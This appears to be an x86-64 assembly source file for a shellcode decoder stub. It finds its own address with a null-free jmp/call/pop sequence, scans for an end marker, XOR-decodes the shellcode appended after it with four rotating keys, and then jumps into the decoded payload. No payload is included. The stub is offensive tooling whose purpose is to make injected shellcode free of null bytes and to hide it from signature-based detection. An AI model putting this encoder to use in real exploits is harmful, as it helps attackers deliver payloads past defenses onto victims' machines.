
[BITS 64]

;begin starts null-free instructions to find instruction pointer
begin:
	jmp pic_begin

begin2:
	jmp header_start

pic_begin:
	call begin2

header_start:
	pop rax ;Holds pic address of code
	sub rax, 0x9 ;Adjust for beginning of jmp/jmp/call nonsense
	xor rbx, rbx
	xor rcx, rcx
	xor rdx, rdx
	xor rsi, rsi
	xor rdi, rdi

get_start_shellcode:
	jmp trampoline64 
got_start_shellcode:
	pop rbx ;ebx holds start of shellcode

find_end:
	mov rdx, [rbx+rcx]
	mov r9, 0xddccbbaaddccbbaa 
	cmp rdx, r9 ;end of shellcode bytes
	je start_encoding
	inc rcx
	jmp find_end

; got_length, ecx holds length of shellcode
start_encoding:
	mov rsi, rbx ;put beginning of shellcode into esi, ebx will be overwritten
	dec rcx
	dec rcx
	dec rcx ;decrease length of shellcode by 3 because each XOR operation applies to dword from address (current + 3 bytes), also non-null bytes
start_encoding_loop:
	mov rdx, [rsi]
	mov rbx, rax
	add bl, key1 ;have to use 8-bit register to remove null bytes
	xor rdx, [rbx]
	mov [rsi], rdx
	inc rsi
	dec rcx
	test rcx, rcx
	je actual_start_shellcode
	jmp aftertrampoline64
trampoline64:
	jmp start_shellcode
aftertrampoline64:
	mov rdx, [rsi]
	mov rbx, rax
	add bl, key2 ;have to use 8-bit register to remove null bytes
	xor rdx, [rbx]
	mov [rsi], rdx
	inc rsi
	dec rcx
	test rcx, rcx
	je actual_start_shellcode
	mov rdx, [rsi]
	mov rbx, rax
	add bl, key3 ;have to use 8-bit register to remove null bytes
	xor rdx, [rbx]
	mov [rsi], rdx
	inc rsi
	dec rcx
	test rcx, rcx
	je actual_start_shellcode
	mov rdx, [rsi]
	mov rbx, rax
	add bl, key4 ;have to use 8-bit register to remove null bytes
	xor rdx, [rbx]
	mov [rsi], rdx
	inc rsi
	dec rcx
	test rcx, rcx
	je actual_start_shellcode
	jmp start_encoding_loop

key1:
	dq 0x1223344556677889

key2:
	dq 0x9944aa729944aa72

key3:
	dq 0xbccddeeffeeddccb

key4:
	dq 0xaaaaaaaaaaaaaaaa

start_shellcode:
	call got_start_shellcode

actual_start_shellcode: